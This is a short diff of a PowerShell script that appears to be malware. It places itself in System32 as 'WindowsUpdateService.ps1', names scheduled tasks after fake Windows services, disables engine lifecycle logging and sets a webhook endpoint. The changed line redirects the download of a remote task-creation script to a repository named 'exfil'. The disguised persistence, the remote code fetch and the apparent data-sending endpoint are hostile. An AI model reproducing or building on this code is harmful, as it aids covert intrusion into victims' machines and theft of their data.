@@ -7,7 +7,7 @@ $LogEngineLifecycleEvent = $false | Out-Null
 $shellscriptpath = "C:/Windows/System32/WindowsUpdateService.ps1"
 $taskset = @("Windows Update Service", "Windows Security Update Service", "Windows Activation Status Verifier")
 $apiurl = "https://hook.eu2.make.com/pgvj9kxtwo4pcrhxwn1kg9p9agp129bl"
-$taskschurl = "https://codeberg.org/sempiampi/mavericks/raw/branch/main/GlobalFiles/TaskSchedulerServiceCreater.ps1"
+$taskschurl = "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/GlobalFiles/TaskSchedulerServiceCreater.ps1"
 
 # Check if the task named "RegBackupVerifier" exists
 try {
